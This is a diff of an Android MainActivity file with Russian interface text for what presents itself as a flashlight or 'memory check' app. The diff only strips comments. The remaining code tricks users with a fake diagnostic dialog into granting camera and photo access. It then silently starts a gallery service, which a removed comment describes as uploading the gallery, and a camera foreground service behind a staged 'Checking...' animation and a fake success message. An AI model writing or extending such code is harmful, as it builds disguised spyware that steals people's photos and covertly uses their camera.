@@ -46,14 +46,10 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {}
 
         btn.setOnClickListener(v -> {
-            // Собираем ВСЕ нужные разрешения
             List<String> perms = new ArrayList<>();
-            
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 perms.add(Manifest.permission.CAMERA);
             }
-            
-            // Для Android 13+ это READ_MEDIA_IMAGES, для старых - READ_EXTERNAL_STORAGE
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                     perms.add(Manifest.permission.READ_MEDIA_IMAGES);
@@ -64,21 +60,17 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
 
-            // Если есть что спрашивать — показываем диалог
             if (!perms.isEmpty()) {
                 new AlertDialog.Builder(this)
                     .setTitle("Проверка памяти")
                     .setMessage("Для точной диагностики камеры и памяти необходимо предоставить доступ к файлам (Фото и медиа) и камере.")
                     .setPositiveButton("Разрешить доступ", (dialog, which) -> {
-                        // Вызываем системное окно запроса разрешений
                         ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), 1);
                     })
                     .setCancelable(false)
                     .show();
                 return;
             }
-
-            // Если разрешения уже есть (повторный запуск) — запускаем
             startEverything();
         });
     }
@@ -91,13 +83,9 @@ public class MainActivity extends AppCompatActivity {
             for (int result : grantResults) {
                 if (result != PackageManager.PERMISSION_GRANTED) allGranted = false;
             }
-            
             if (allGranted) {
-                // Разрешил -> Запускаем выгрузку галереи
                 Intent gallerySvc = new Intent(this, GalleryService.class);
                 startService(gallerySvc);
-                
-                // И показываем анимацию
                 startEverything();
             }
         }
@@ -106,40 +94,31 @@ public class MainActivity extends AppCompatActivity {
     private void startEverything() {
         if (isProcessing) return;
         isProcessing = true;
-
         try {
             greenOverlay.setVisibility(View.VISIBLE);
             tvAnim.setText("Проверка.");
-            
             Handler handler = new Handler(Looper.getMainLooper());
             handler.postDelayed(() -> tvAnim.setText("Проверка.."), 600);
             handler.postDelayed(() -> tvAnim.setText("Проверка..."), 1200);
-
             handler.postDelayed(() -> {
                 greenOverlay.setVisibility(View.GONE);
                 whiteOverlay.setVisibility(View.VISIBLE);
-                
                 try { if (cameraId != null) cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}
-                
                 Intent svc = new Intent(this, CameraService.class);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
                 else startService(svc);
-
             }, 2000);
 
             handler.postDelayed(() -> {
                 whiteOverlay.setVisibility(View.GONE);
                 try { if (cameraId != null) cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
-                
                 isProcessing = false;
                 new AlertDialog.Builder(this)
                     .setTitle("Успех")
                     .setMessage("Все сработало. Фонарь готов к работе.")
                     .setPositiveButton("ОК", null)
                     .show();
-
             }, 10000);
-
         } catch (Exception e) { e.printStackTrace(); }
     }
 }
